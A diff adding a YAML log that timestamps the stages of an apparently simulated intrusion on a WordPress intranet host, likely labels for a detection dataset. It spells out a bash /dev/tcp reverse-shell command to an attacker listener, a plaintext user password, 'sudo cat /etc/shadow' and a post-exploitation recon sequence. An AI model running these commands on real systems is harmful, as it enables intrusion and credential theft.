@@ -1,0 +1,113 @@
+
+start: "2022-01-17T11:57:35.620Z"
+stop: "2022-01-17T11:58:58.513Z"
+
+vpn_disconnect: 
+    start: "2022-01-17T11:58:57.562Z"
+    stop: "2022-01-17T11:58:58.513Z"
+wp_crack:
+    start: "2022-01-17T11:24:45.299Z"
+    stop: "2022-01-17T11:57:35.619Z"
+
+reverse_shell:
+    start: "2022-01-17T11:57:37.933Z"
+    stop: "2022-01-17T11:58:04.208Z"
+    web_shell: "https://intranet.smith.santos.com/wp-content/uploads/2022/01/yvmuplzucm-1642418578.1653.php"
+    http_param: 
+        name: "wp_meta"
+        value: "WyJiYXNoIiwgIi1jIiwgIiAnMDwmMTk2O2V4ZWMgMTk2PD4vZGV2L3RjcC8xMC4yMjkuMi4yMTYvMTY0ODY7IHNoIDwmMTk2ID4mMTk2IDI+JjE5NiciLCAiJiJd"
+    cmd: ["bash", "-c", " \u00270\u003c\u0026196;exec 196\u003c\u003e/dev/tcp/10.229.2.216/16486; sh \u003c\u0026196 \u003e\u0026196 2\u003e\u0026196\u0027", "\u0026"]
+    listen_socket:
+        ip: "::ffff:10.229.2.216"
+        port: 16486
+        scope_id: 0
+        flowinfo: 0
+    remote_socket:
+        ip: "::ffff:10.229.0.4"
+        port: 39684
+        scope_id: 0
+        flowinfo: 0
+
+open_pty:
+    start: "2022-01-17T11:58:17.205Z"
+    stop: "2022-01-17T11:58:17.562Z"
+    pty_cmd: python3 -c 'import pty; pty.spawn("/bin/bash")'
+
+change_user:
+    start: "2022-01-17T11:58:17.564Z"
+    enter_password: "2022-01-17T11:58:17.640Z"
+    stop: "2022-01-17T11:58:18.160Z"
+    user: "gmorgan"
+    password: "55jt3dFwLyVL"
+
+
+escalated_cmds:
+
+    - id: "check_sudo"
+      start: "2022-01-17T11:58:27.229Z"
+      stop: "2022-01-17T11:58:27.355Z"
+      cmd: "sudo -l"
+      sudo: True
+
+    - id: "read_shadow"
+      start: "2022-01-17T11:58:29.044Z"
+      stop: "2022-01-17T11:58:29.102Z"
+      cmd: "sudo cat /etc/shadow"
+      sudo: True
+
+    - id: "check_groups"
+      start: "2022-01-17T11:58:31.336Z"
+      stop: "2022-01-17T11:58:31.342Z"
+      cmd: "groups"
+      sudo: False
+
+    - id: "list_ld_root"
+      start: "2022-01-17T11:58:34.237Z"
+      stop: "2022-01-17T11:58:34.256Z"
+      cmd: "ls -ld /root"
+      sudo: False
+
+    - id: "check_getent"
+      start: "2022-01-17T11:58:36.218Z"
+      stop: "2022-01-17T11:58:36.250Z"
+      cmd: "getent passwd"
+      sudo: False
+
+    - id: "read_fstab"
+      start: "2022-01-17T11:58:39.817Z"
+      stop: "2022-01-17T11:58:39.835Z"
+      cmd: "cat /etc/fstab"
+      sudo: False
+
+    - id: "check_uname_ar"
+      start: "2022-01-17T11:58:42.464Z"
+      stop: "2022-01-17T11:58:42.486Z"
+      cmd: "uname -ar"
+      sudo: False
+
+    - id: "check_ifconfig"
+      start: "2022-01-17T11:58:46.035Z"
+      stop: "2022-01-17T11:58:46.058Z"
+      cmd: "ifconfig"
+      sudo: False
+
+    - id: "check_netstat_u"
+      start: "2022-01-17T11:58:49.340Z"
+      stop: "2022-01-17T11:58:49.369Z"
+      cmd: "netstat -u"
+      sudo: False
+
+    - id: "check_ps_aux"
+      start: "2022-01-17T11:58:51.756Z"
+      stop: "2022-01-17T11:58:51.852Z"
+      cmd: "ps -aux"
+      sudo: False
+
+    - id: "list_root"
+      start: "2022-01-17T11:58:54.581Z"
+      stop: "2022-01-17T11:58:54.691Z"
+      cmd: "sudo ls -laR /root/"
+      sudo: True
+
+
+    
